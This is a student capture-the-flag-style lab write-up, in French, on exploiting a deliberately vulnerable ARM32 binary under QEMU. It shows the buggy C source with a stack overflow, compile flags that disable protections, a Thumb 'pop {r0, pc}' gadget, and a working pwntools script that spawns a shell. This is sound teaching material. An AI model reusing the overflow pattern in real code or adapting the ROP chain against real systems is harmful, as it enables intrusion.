# Write-up — Lab 19 : ARM ROP Chain — system("/bin/sh")

> **Embedded Security — ARM / QEMU**
> Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · 2026

[![ARM32](https://img.shields.io/badge/arch-ARM32-red.svg)]()
[![ROP](https://img.shields.io/badge/technique-ROP%20chain-orange.svg)]()
[![system](https://img.shields.io/badge/target-system%28%22%2Fbin%2Fsh%22%29-blue.svg)]()
[![Solved](https://img.shields.io/badge/Lab-Solved-brightgreen.svg)]()

---

## 1. TL;DR

**Contexte :** Pas de `win()` — NX activé — il faut construire une ROP chain ARM  
**Technique :** Gadget `pop {r0, pc}` (Thumb) → r0 = &"/bin/sh" → PC = system@plt  
**Différence vs x86 :** Arguments dans r0 (pas sur la stack), mode Thumb (LSB=1 pour les gadgets)

---

## 2. ARM32 calling convention

```
r0  = 1er argument (équivalent RDI en x86-64)
r1  = 2ème argument
r2  = 3ème argument
pc  = pointeur d'instruction (équivalent RIP)
lr  = adresse de retour (link register)
```

Pour `system("/bin/sh")` : il faut **r0 = adresse de "/bin/sh"**.

---

## 3. Gadget ARM Thumb : `pop {r0, pc}`

```asm
pop {r0, pc}   ; pop la stack → r0 = valeur 1 ; pc = valeur 2
```

En Thumb (`.thumb_func` dans le source) → LSB du symbole = 1 → le processeur sait que c'est du Thumb.

**Stack au moment du gadget :**
```
[adresse binsh]  → poppé dans r0
[adresse system] → poppé dans pc → system("/bin/sh")
```

---

## 4. Code — `target.c`

```c
// Gadget Thumb explicite
__asm__(".section .text\n"
        ".thumb\n"
        ".global pop_r0_pc\n"
        ".thumb_func\n"
        "pop_r0_pc:\n\tpop {r0, pc}\n");

const char binsh[] = "/bin/sh";

void vulnerable() {
    char buffer[64];
    read(0, buffer, 200);
}

int main() {
    if (0) system("");  // system dans PLT
    vulnerable();
}
```

---

## 5. Compilation

```bash
arm-linux-gnueabihf-gcc -g -fno-stack-protector -no-pie -o target target.c
checksec --file=target
# NX enabled, No PIE, No canary
```

---

## 6. ROP chain ARM32

```
OFFSET (76 bytes) | pop_r0_pc | binsh_addr | system_plt
                       ↓              ↓            ↓
                    gadget       r0 = "/bin/sh"   PC → system()
```

---

## 7. Exploit — `exploit.py`

```python
from pwn import *
elf = ELF('./target')
context.binary = elf; context.arch = 'arm'

p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabihf', './target'])

rop = ROP(elf)
rop.raw(elf.sym['pop_r0_pc'])   # gadget Thumb (LSB=1 automatique)
rop.raw(elf.sym['binsh'])       # → r0
rop.raw(elf.plt['system'])      # → pc

payload = b'A' * 76 + rop.chain()
p.recvuntil(b'Input : ')
p.send(payload)
p.interactive()
```

---

## 8. Progression ARM

| Lab | Technique | Gadgets |
| --- | --- | --- |
| Lab18 | ret2win | Aucun |
| **Lab19** | **ROP system()** | **pop {r0, pc}** |
| Lab20 | ret2libc ARM | Leak libc + ROP |

---

## Résumé technique

| Élément | Valeur |
| --- | --- |
| Architecture | ARM32 Thumb |
| Gadget | `pop {r0, pc}` — mode Thumb |
| Cible | `system@plt` |
| Argument r0 | `&"/bin/sh"` (global dans binaire) |
| Offset | 76 bytes (identique Lab18) |

> Screenshot : [docs/lab19_arm_rop_shell.png](docs/lab19_arm_rop_shell.png)

---

*Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · Dakar, 2026*
